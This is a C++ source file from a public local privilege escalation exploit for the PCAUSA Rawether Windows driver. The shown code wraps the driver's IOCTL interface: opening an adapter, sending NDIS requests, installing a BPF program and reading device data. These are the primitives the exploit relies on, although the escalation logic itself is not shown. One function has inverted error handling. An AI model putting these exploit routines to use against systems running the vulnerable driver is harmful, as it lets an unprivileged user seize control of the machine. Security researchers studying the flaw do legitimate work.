/**
*
* PCAUSA Rawether for Windows local privilege escalation
*
* Copyright (c) 2017 ReWolf
* http://blog.rewolf.pl/
* http://blog.rewolf.pl/blog/?p=1778
*
* This program is free software: you can redistribute it and/or modify
* it under the terms of the GNU Lesser General Public License as published
* by the Free Software Foundation, either version 3 of the License, or
* (at your option) any later version.
*
* This program is distributed in the hope that it will be useful,
* but WITHOUT ANY WARRANTY; without even the implied warranty of
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
* GNU Lesser General Public License for more details.
*
* You should have received a copy of the GNU Lesser General Public License
* along with this program.  If not, see <http://www.gnu.org/licenses/>.
*
*/
#include "PcaSp60.h"
#include <ntstatus.h>

bool OpenAdapter(HANDLE hDevice, const std::wstring& adapterName)
{
	DWORD dummy;
	if (!DeviceIoControl(hDevice, 0x80002040, 0, 0, 0, 0, &dummy, 0))
		return false;

	OVERLAPPED overlapped = { 0 };
	overlapped.hEvent = CreateEvent(nullptr, TRUE, FALSE, nullptr);
	if (NULL == overlapped.hEvent)
		return false;

	dummy = 0;
	if (!DeviceIoControl(hDevice, 0x80002008, (LPVOID)adapterName.c_str(), (DWORD)adapterName.length() * sizeof(wchar_t), 0, 0, &dummy, &overlapped))
	{
		if (GetLastError() == ERROR_IO_PENDING)
		{
			if (!GetOverlappedResult(hDevice, &overlapped, &dummy, TRUE))
			{
				CloseHandle(overlapped.hEvent);
				return false;
			}
		}
	}
	CloseHandle(overlapped.hEvent);
	return true;
}

bool MakeNdisRequest(HANDLE hDevice, _RETH_REQUEST *inBuffer)
{
	OVERLAPPED overlapped = { 0 };
	overlapped.hEvent = CreateEvent(nullptr, TRUE, FALSE, nullptr);
	if (NULL == overlapped.hEvent)
		return false;

	DWORD dummy;

	inBuffer->nRequestStatus = STATUS_UNSUCCESSFUL;
	if (!DeviceIoControl(hDevice, 0x80002010, inBuffer, sizeof(_RETH_REQUEST), inBuffer, sizeof(_RETH_REQUEST), (LPDWORD)&hDevice, &overlapped))
	{
		if (GetLastError() == ERROR_IO_PENDING)
		{
			if (GetOverlappedResult(hDevice, &overlapped, &dummy, TRUE))
			{
				CloseHandle(overlapped.hEvent);
				return false;
			}
		}
	}
	CloseHandle(overlapped.hEvent);
	return true;
}

bool MakeNdisRequest_OID_GEN_CURRENT_PACKET_FILTER(HANDLE hDevice, int packetType)
{
	_RETH_REQUEST InBuffer = { 0 };

	InBuffer.NdisRequest.RequestType = 1;						// NdisRequestSetInformation
	InBuffer.NdisRequest.DATA.SET_INFORMATION.Oid = 0x1010E;	// OID_GEN_CURRENT_PACKET_FILTER
	InBuffer.NdisRequest.DATA.SET_INFORMATION.InformationBuffer = &packetType;
	InBuffer.NdisRequest.DATA.SET_INFORMATION.InformationBufferLength = sizeof(packetType);
	return MakeNdisRequest(hDevice, &InBuffer);
}

bool SetBPFProgram(HANDLE hDevice, bpf_insn *bpfProgram, DWORD bpfProgramSize)
{
	OVERLAPPED overlapped = { 0 };
	overlapped.hEvent = CreateEvent(nullptr, TRUE, FALSE, nullptr);
	if (NULL == overlapped.hEvent)
		return false;

	DWORD dummy;
	if (!DeviceIoControl(hDevice, 0x8000202C, bpfProgram, bpfProgramSize, 0, 0, &dummy, &overlapped))
	{
		if (GetLastError() == ERROR_IO_PENDING)
		{
			if (!GetOverlappedResult(hDevice, &overlapped, &dummy, TRUE))
			{
				CloseHandle(overlapped.hEvent);
				return false;
			}
		}
	}
	CloseHandle(overlapped.hEvent);
	return true;
}

bool Read(HANDLE hDevice, BYTE* buf, DWORD size)
{
	OVERLAPPED overlapped = { 0 };
	overlapped.hEvent = CreateEvent(nullptr, TRUE, FALSE, nullptr);
	if (NULL == overlapped.hEvent)
		return false;

	DWORD dummy;
	if (!ReadFile(hDevice, buf, size, &dummy, &overlapped))
	{
		if (GetLastError() == ERROR_IO_PENDING)
		{
			if (!GetOverlappedResult(hDevice, &overlapped, &dummy, TRUE))
			{
				CloseHandle(overlapped.hEvent);
				return false;
			}
		}
	}
	CloseHandle(overlapped.hEvent);
	return true;
}
